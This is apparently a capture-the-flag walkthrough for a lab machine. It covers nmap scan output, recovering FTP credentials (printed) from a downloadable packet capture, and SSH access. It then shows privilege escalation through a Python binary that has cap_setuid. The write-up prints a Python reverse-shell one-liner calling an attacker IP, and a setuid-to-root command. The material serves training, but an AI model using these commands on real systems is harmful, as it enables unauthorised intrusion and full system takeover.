
# Extended port overview:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Mon, 11 Nov 2024 18:28:28 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 11 Nov 2024 18:28:19 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 11 Nov 2024 18:28:20 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=11/11%Time=67324CC4%P=x86_64-pc-linux-gnu%r(Get
SF:Request,2A0C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Mon,\x2011\x20Nov\x202024\x2018:28:19\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2019
SF:386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">
SF:\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x
SF:20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20
SF:\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta
SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
SF:=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"imag
SF:e/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\"
SF:>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fo
SF:nt-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel
SF:=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\
SF:.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/
SF:css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptio
SF:ns,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x
SF:2011\x20Nov\x202024\x2018:28:20\x20GMT\r\nConnection:\x20close\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x
SF:20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x2
SF:0\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>
SF:\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inval
SF:id\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTS
SF:P/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,18
SF:9,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Mon,\x2011\x20Nov\x202024\x2018:28:28\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232
SF:\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x2
SF:0Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1
SF:>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20se
SF:rver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20c
SF:heck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Quick port overview:

```

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

# HTTP server inspection 
So we start analyzing the http server:
![[Pasted image 20241111192950.png]]


We start inspecting the webpage and we discover that we can download some files from `http://10.10.10.245/data/1`
Trying some other data queries we find out that the `http://10.10.10.245/data/0` contains more data. After some quick string search we find a credential in there:
```
strings 0.pcap| grep -A 4 -B 4 pass

USER nathan
PASS Buck3tH4TF0RM3!
```

Then we directly go and try our creds over ssh and we are in:
User.txt:
```
124e17...
```
We then inject the linpeas.sh script and we find out a very interesting binary that has some vulnerable capabilities:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

So we then go to corresponding (hacktricks)[] web page and find the next potential python payload:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",31415));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
This does not work, so is time to check further [hacktricks linux-capabilities info](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example) web:

```
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

And BOOM! we are root already!
```
root.txt
08db...
```
